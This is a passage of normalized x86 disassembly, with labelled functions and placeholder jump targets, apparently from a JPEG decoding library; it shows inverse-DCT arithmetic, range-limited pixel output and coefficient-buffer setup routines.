mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x28 ]
add ecx 0x4
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x2c ]
add edx 0x4
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x38 ]
sub eax 0x1
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x2c ]
mov ecx [ eax ]
shl ecx 0xe
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x2c ]
mov eax [ edx + 0x8 ]
imul eax eax 0x3b21
mov ecx [ ebp - 0x2c ]
mov edx [ ecx + 0x18 ]
imul edx edx 0xffffe782
add eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x2c ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x2c ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x2c ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x2c ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x14 ]
imul ecx ecx 0xfffff93e
mov edx [ ebp - 0x18 ]
imul edx edx 0x2e75
add ecx edx
mov eax [ ebp - 0x1c ]
imul eax eax 0xffffba79
add ecx eax
mov edx [ ebp - 0x20 ]
imul edx edx 0x21f9
add ecx edx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x14 ]
imul eax eax 0xffffefb0
mov ecx [ ebp - 0x18 ]
imul ecx ecx 0xffffecc2
add eax ecx
mov edx [ ebp - 0x1c ]
imul edx edx 0x1ccd
add eax edx
mov ecx [ ebp - 0x20 ]
imul ecx ecx 0x5203
add eax ecx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
lea ecx [ eax + edx + 0x40000 ]
sar ecx 0x13
and ecx 0x3ff
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
mov cl [ eax + ecx ]
mov [ edx ] cl
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x8 ]
add edx 0x40000
sar edx 0x13
and edx 0x3ff
mov eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x34 ]
mov dl [ ecx + edx ]
mov [ eax + 0x3 ] dl
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
lea edx [ ecx + eax + 0x40000 ]
sar edx 0x13
and edx 0x3ff
mov eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x34 ]
mov dl [ ecx + edx ]
mov [ eax + 0x1 ] dl
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x4 ]
add eax 0x40000
sar eax 0x13
and eax 0x3ff
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x34 ]
mov al [ edx + eax ]
mov [ ecx + 0x2 ] al
mov ecx [ ebp - 0x2c ]
add ecx 0x20
mov [ ebp - 0x2c ] ecx
jmp r-xdata
mov eax [ ebp - 0x2c ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x24 ]
movsx eax [ edx + 0x30 ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x38 ]
add ecx 0x1
mov [ ebp - 0x38 ] ecx
mov ecx [ ebp - 0x2c ]
cmp [ ecx + 0xc ] 0x0
jne r-xdata
mov ecx [ ebp - 0x24 ]
movsx edx [ ecx + 0x50 ]
test edx edx
jne r-xdata
mov edx [ ebp - 0x2c ]
cmp [ edx + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0x24 ]
movsx ecx [ eax + 0x60 ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x2c ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov edx [ ebp - 0x24 ]
movsx eax [ edx + 0x70 ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x2c ]
cmp [ ecx + 0x1c ] 0x0
jne r-xdata
mov ecx [ ebp - 0x24 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x28 ]
imul edx [ eax ]
shl edx 0x2
mov [ ebp - 0xbc ] edx
mov ecx [ ebp - 0x2c ]
mov edx [ ebp - 0xbc ]
mov [ ecx ] edx
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0xbc ]
mov [ eax + 0x20 ] ecx
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xbc ]
mov [ edx + 0x40 ] eax
mov ecx [ ebp - 0x2c ]
mov edx [ ebp - 0xbc ]
mov [ ecx + 0x60 ] edx
jmp r-xdata
mov edx [ ebp - 0x2c ]
mov eax [ edx ]
add eax 0x10
sar eax 0x5
and eax 0x3ff
mov ecx [ ebp - 0x34 ]
mov dl [ ecx + eax ]
mov [ ebp - 0xc0 ] dl
mov eax [ ebp - 0x30 ]
mov cl [ ebp - 0xc0 ]
mov [ eax ] cl
mov edx [ ebp - 0x30 ]
mov al [ ebp - 0xc0 ]
mov [ edx + 0x1 ] al
mov ecx [ ebp - 0x30 ]
mov dl [ ebp - 0xc0 ]
mov [ ecx + 0x2 ] dl
mov eax [ ebp - 0x30 ]
mov cl [ ebp - 0xc0 ]
mov [ eax + 0x3 ] cl
mov edx [ ebp - 0x2c ]
add edx 0x20
mov [ ebp - 0x2c ] edx
jmp r-xdata
sub_42cc40
push ebp
mov ebp esp
sub esp 0xac
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x120 ]
add ecx 0x80
mov [ ebp - 0x20 ] ecx
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x50 ]
mov [ ebp - 0x14 ] ecx
lea edx [ ebp - 0x64 ]
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x24 ] 0x8
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
lea eax [ ebp - 0x64 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x24 ] 0x0
jmp r-xdata
cmp [ ebp - 0x24 ] 0x6
je r-xdata
cmp [ ebp - 0x24 ] 0x2
jge r-xdata
jmp r-xdata
cmp [ ebp - 0x24 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x24 ]
mov eax [ ebp + 0x14 ]
mov ecx [ eax + edx * 4 ]
add ecx [ ebp + 0x18 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x18 ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x2
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x14 ]
add ecx 0x4
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x18 ]
add edx 0x4
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x24 ]
sub eax 0x1
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0x2
jne r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
shl ecx 0xf
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x18 ]
mov eax [ edx + 0x1c ]
imul eax eax 0xffffe8ee
mov ecx [ ebp - 0x18 ]
mov edx [ ecx + 0x14 ]
imul edx edx 0x1b37
add eax edx
mov ecx [ ebp - 0x18 ]
mov edx [ ecx + 0xc ]
imul edx edx 0xffffd746
add eax edx
mov ecx [ ebp - 0x18 ]
mov edx [ ecx + 0x4 ]
imul edx edx 0x73fc
add eax edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
lea edx [ ecx + eax + 0x80000 ]
sar edx 0x14
and edx 0x3ff
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x20 ]
mov dl [ ecx + edx ]
mov [ eax ] dl
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x4 ]
add eax 0x80000
sar eax 0x14
and eax 0x3ff
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov al [ edx + eax ]
mov [ ecx + 0x1 ] al
mov ecx [ ebp - 0x18 ]
add ecx 0x20
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov ecx [ ebp - 0x10 ]
movsx edx [ ecx + 0x10 ]
test edx edx
jne r-xdata
mov ecx [ ebp - 0x24 ]
add ecx 0x1
mov [ ebp - 0x24 ] ecx
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x10 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x14 ]
imul edx [ eax ]
mov [ ebp - 0xc ] edx
mov ecx [ ebp - 0xc ]
shl ecx 0xf
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x10 ]
movsx eax [ edx + 0x70 ]
mov ecx [ ebp - 0x14 ]
imul eax [ ecx + 0xe0 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
imul edx edx 0xffffe8ee
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x10 ]
movsx ecx [ eax + 0x50 ]
mov edx [ ebp - 0x14 ]
imul ecx [ edx + 0xa0 ]
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0xc ]
imul eax eax 0x1b37
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x10 ]
movsx eax [ edx + 0x30 ]
mov ecx [ ebp - 0x14 ]
imul eax [ ecx + 0x60 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
imul edx edx 0xffffd746
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
movsx edx [ ecx + 0x10 ]
mov eax [ ebp - 0x14 ]
imul edx [ eax + 0x20 ]
mov [ ebp - 0xc ] edx
mov ecx [ ebp - 0xc ]
imul ecx ecx 0x73fc
mov edx [ ebp - 0x4 ]
add edx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
lea edx [ ecx + eax + 0x1000 ]
sar edx 0xd
mov eax [ ebp - 0x18 ]
mov [ eax ] edx
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x4 ]
add ecx 0x1000
sar ecx 0xd
mov edx [ ebp - 0x18 ]
mov [ edx + 0x20 ] ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
movsx ecx [ eax + 0x30 ]
test ecx ecx
jne r-xdata
mov edx [ ebp - 0x18 ]
cmp [ edx + 0x1c ] 0x0
jne r-xdata
mov edx [ ebp - 0x10 ]
movsx eax [ edx + 0x50 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
add ecx 0x10
sar ecx 0x5
and ecx 0x3ff
mov edx [ ebp - 0x20 ]
mov al [ edx + ecx ]
mov [ ebp - 0x6c ] al
mov ecx [ ebp - 0x1c ]
mov dl [ ebp - 0x6c ]
mov [ ecx ] dl
mov eax [ ebp - 0x1c ]
mov cl [ ebp - 0x6c ]
mov [ eax + 0x1 ] cl
mov edx [ ebp - 0x18 ]
add edx 0x20
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
movsx edx [ ecx + 0x70 ]
test edx edx
jne r-xdata
mov eax [ ebp - 0x10 ]
movsx ecx [ eax ]
mov edx [ ebp - 0x14 ]
imul ecx [ edx ]
shl ecx 0x2
mov [ ebp - 0x68 ] ecx
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x68 ]
mov [ eax ] ecx
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x68 ]
mov [ edx + 0x20 ] eax
jmp r-xdata
sub_42cf10
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x120 ]
add ecx 0x80
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x50 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x10 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x8 ]
imul edx [ eax ]
mov [ ebp - 0x4 ] edx
mov ecx [ ebp - 0x4 ]
add ecx 0x4
sar ecx 0x3
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
and edx 0x3ff
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
mov eax [ ebp + 0x18 ]
mov esi [ ebp - 0xc ]
mov dl [ esi + edx ]
mov [ ecx + eax ] dl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42cf70
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
push 0x40
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x140 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_42d050
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0xb0 ]
test ecx ecx
je r-xdata
mov edx [ ebp + 0xc ]
and edx 0xff
test edx edx
je r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x4
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0x3c ]
jge r-xdata
mov edx [ ebp - 0xc ]
mov eax [ edx + 0xc ]
shl eax 0x3
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x1c ]
shl edx 0x3
push edx
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx + 0x8 ]
add esp 0x10
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x18 ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0xc ]
add edx 0x54
mov [ ebp - 0xc ] edx
sub_42d050
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x140 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0xb0 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x0
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov [ ecx + 0x14 ] edx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] sub_42d0e0
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x4
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
sub_42d0e0
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x140 ]
mov [ ebp - 0x4 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
cmp [ edx + 0xc ] 0x8
jae r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0xc ] 0x8
je r-xdata
push 0x8
mov eax [ ebp - 0x4 ]
add eax 0xc
push eax
mov ecx [ ebp - 0x4 ]
add ecx 0x18
push ecx
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x144 ]
call [ ecx + 0x4 ]
add esp 0x1c
mov eax [ ebp - 0x4 ]
add eax 0x18
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x148 ]
call [ eax + 0x4 ]
add esp 0x8
and eax 0xff
test eax eax
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + 0x10 ]
test edx edx
je r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + 0x10 ]
test edx edx
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
add eax 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
add ecx 0x1
mov edx [ ebp + 0x10 ]
mov [ edx ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
sub ecx 0x1
mov edx [ ebp + 0x10 ]
mov [ edx ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x8 ]
cmp ecx [ eax + 0xe0 ]
jae r-xdata
sub_42d1e0
push ebp
mov ebp esp
sub esp 0x54
push ebx
push esi
push edi
push 0x68
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x148 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_42d310
mov eax [ ebp + 0xc ]
and eax 0xff
test eax eax
je r-xdata
push 0x500
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx + 0x4 ]
add esp 0xc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov [ ebp - 0x8 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
cmp [ ebp - 0x14 ] 0xa
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edx + 0x3c ]
jge r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x40 ] 0x0
mov eax [ ebp - 0x14 ]
shl eax 0x7
mov ecx [ ebp - 0x10 ]
add ecx eax
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov [ eax + edx * 4 + 0x18 ] ecx
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0xc ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0xc ]
push ecx
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x20 ]
push eax
call sub_420c90
add esp 0x8
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x8 ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x1c ]
push ecx
call sub_420c90
add esp 0x8
push eax
push 0x0
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx + 0x14 ]
add esp 0x18
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0x40 ] eax
jmp r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0xc ]
add ecx 0x54
mov [ ebp - 0xc ] ecx
sub_42d310
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x148 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_42d410
add esp 0x4
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x40 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x2
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] sub_42d4a0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x4
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x40 ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x3
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] sub_42da20
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x4
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x40 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_42d760
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x4
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
sub_42d410
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x148 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
cmp [ edx + 0xe4 ] 0x1
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xe0 ]
sub edx 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] edx
jae r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x1
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xe8 ]
mov ecx [ ebp - 0x4 ]
mov edx [ eax + 0x48 ]
mov [ ecx + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xe8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ edx + 0xc ]
mov [ eax + 0x14 ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x10 ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42d4a0
push ebp
mov ebp esp
sub esp 0x78
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x148 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xf8 ]
sub eax 0x1
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xe0 ]
sub edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
mov [ ebp - 0x24 ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x24 ]
cmp ecx [ eax + 0x14 ]
jge r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
add eax 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] eax
mov edx [ ebp + 0x8 ]
push edx
call sub_42d410
add esp 0x4
mov al 0x1
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0xc ]
ja r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] 0x0
jmp r-xdata
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov edx [ ebp - 0x24 ]
add edx 0x1
mov [ ebp - 0x24 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x1c ]
cmp edx [ ecx + 0xe4 ]
jge r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x18
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x15c ]
call [ edx + 0x4 ]
add esp 0x8
and eax 0xff
test eax eax
jne r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0xe8 ]
mov [ ebp - 0x34 ] edx
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x24 ]
mov [ eax + 0x10 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
xor al al
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov ecx [ eax + 0x44 ]
mov [ ebp - 0x38 ] ecx
mov ecx [ ebp - 0x34 ]
mov edx [ ecx + 0x34 ]
mov [ ebp - 0x38 ] edx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x20 ]
cmp edx [ ecx + 0x38 ]
jge r-xdata
mov edx [ ebp - 0x38 ]
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x34 ]
mov ecx [ ebp - 0x8 ]
imul ecx [ eax + 0x40 ]
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x24 ]
shl edx 0x3
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x20 ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx [ ebp - 0x10 ]
jb r-xdata
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x28 ]
push ecx
mov edx [ ebp - 0x30 ]
push edx
mov eax [ ebp - 0x2c ]
push eax
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + ecx * 4 + 0x18 ]
push eax
mov ecx [ ebp - 0x34 ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 ]
push ecx
mov edx [ ebp - 0x34 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x158 ]
call [ edx + 0x4 ]
add esp 0x1c
mov eax [ ebp - 0x34 ]
mov ecx [ ebp - 0x28 ]
cmp ecx [ eax + 0x34 ]
jge r-xdata
mov edx [ ebp - 0x24 ]
add edx [ ebp - 0x20 ]
mov eax [ ebp - 0x34 ]
cmp edx [ eax + 0x48 ]
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x34 ]
mov eax [ edx + 0x34 ]
sub eax [ ebp - 0x28 ]
shl eax 0x7
push eax
mov ecx [ ebp - 0x14 ]
add ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + ecx * 4 + 0x18 ]
push eax
call sub_420d70
add esp 0x8
mov ecx [ ebp - 0x28 ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ecx + 0x34 ]
shl edx 0x7
push edx
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + eax * 4 + 0x18 ]
push edx
call sub_420d70
add esp 0x8
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x14 ]
add eax [ edx + 0x34 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x2c ]
add ecx 0x8
mov [ ebp - 0x2c ] ecx
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov ecx [ ebp - 0x18 ]
cmp ecx [ eax + 0x34 ]
jge r-xdata
